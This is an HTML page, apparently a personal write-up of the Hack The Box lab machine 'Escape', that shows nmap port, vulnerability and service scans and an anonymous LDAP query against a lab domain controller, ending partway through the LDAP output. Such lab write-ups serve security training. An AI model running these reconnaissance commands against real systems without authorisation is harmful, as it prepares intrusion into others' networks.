@@ -1,0 +1,1611 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Escape - 10.10.11.202</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="1a3d1b9f-8847-8026-9bb6-cddc26185162" class="page sans"><header><h1 class="page-title">Escape - 10.10.11.202</h1><p class="page-description"></p></header><div class="page-body"><h2 id="1a3d1b9f-8847-8168-86fc-e3eee4108c92" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-816d-8e31-f4e5cf9e5584" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">                                                                                                                    
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ sudo nmap -sS --min-rate=5000 -p- -T5 -n 10.10.11.202                                         
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 15:55 -05
+Nmap scan report for 10.10.11.202
+Host is up (0.11s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49689/tcp open  unknown
+49690/tcp open  unknown
+49702/tcp open  unknown
+49712/tcp open  unknown
+49747/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8197-a9f5-d1761f563550" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ nmap --script vuln 10.10.11.202 -p53,88,135,139,389,445,464,593,636,1433,3268,3269,9389  -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 15:57 -05
+Nmap scan report for 10.10.11.202
+Host is up (0.26s latency).
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+1433/tcp open  ms-sql-s
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+9389/tcp open  adws
+
+Host script results:
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+
+Nmap done: 1 IP address (1 host up) scanned in 51.74 seconds
+</code></pre><p id="1a3d1b9f-8847-8188-bc8f-c7efcf69c471" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-811b-abbb-e50430ee4d88" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ nmap -sVC -T5 -n 10.10.11.202 -p53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 15:56 -05
+Nmap scan report for 10.10.11.202
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-24 04:57:04Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2025-02-24T04:58:27+00:00; +8h00m00s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-02-24T04:58:27+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.10.11.202:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.10.11.202:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-02-24T04:52:24
+|_Not valid after:  2055-02-24T04:52:24
+|_ssl-date: 2025-02-24T04:58:27+00:00; +8h00m00s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-02-24T04:58:27+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-02-24T04:58:27+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-02-24T04:57:46
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 89.68 seconds
+
+                                                                </code></pre><h2 id="1a3d1b9f-8847-81d9-ab6d-d8d3f5aa3509" class="">LDAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8143-a739-ded90236384b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ ldapsearch -x -H ldap://10.10.11.202 -s base              
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn:
+domainFunctionality: 7
+forestFunctionality: 7
+domainControllerFunctionality: 7
+rootDomainNamingContext: DC=sequel,DC=htb
+ldapServiceName: sequel.htb:dc$@SEQUEL.HTB
+isGlobalCatalogReady: TRUE
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 3
+supportedLDAPVersion: 2
+supportedLDAPPolicies: MaxPoolThreads
+supportedLDAPPolicies: MaxPercentDirSyncRequests
+supportedLDAPPolicies: MaxDatagramRecv
+supportedLDAPPolicies: MaxReceiveBuffer
+supportedLDAPPolicies: InitRecvTimeout
+supportedLDAPPolicies: MaxConnections
+supportedLDAPPolicies: MaxConnIdleTime
+supportedLDAPPolicies: MaxPageSize
+supportedLDAPPolicies: MaxBatchReturnMessages
+supportedLDAPPolicies: MaxQueryDuration
+supportedLDAPPolicies: MaxDirSyncDuration
+supportedLDAPPolicies: MaxTempTableSize
+supportedLDAPPolicies: MaxResultSetSize
+supportedLDAPPolicies: MinResultSets
+supportedLDAPPolicies: MaxResultSetsPerConn
+supportedLDAPPolicies: MaxNotificationPerConn
+supportedLDAPPolicies: MaxValRange
+supportedLDAPPolicies: MaxValRangeTransitive
+supportedLDAPPolicies: ThreadMemoryLimit
+supportedLDAPPolicies: SystemMemoryLimitPercent
+supportedControl: 1.2.840.113556.1.4.319
+supportedControl: 1.2.840.113556.1.4.801
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 1.2.840.113556.1.4.528
+supportedControl: 1.2.840.113556.1.4.417
+supportedControl: 1.2.840.113556.1.4.619
+supportedControl: 1.2.840.113556.1.4.841
+supportedControl: 1.2.840.113556.1.4.529
+supportedControl: 1.2.840.113556.1.4.805
+supportedControl: 1.2.840.113556.1.4.521
+supportedControl: 1.2.840.113556.1.4.970
+supportedControl: 1.2.840.113556.1.4.1338
+supportedControl: 1.2.840.113556.1.4.474
+supportedControl: 1.2.840.113556.1.4.1339
+supportedControl: 1.2.840.113556.1.4.1340
+supportedControl: 1.2.840.113556.1.4.1413
+supportedControl: 2.16.840.1.113730.3.4.9
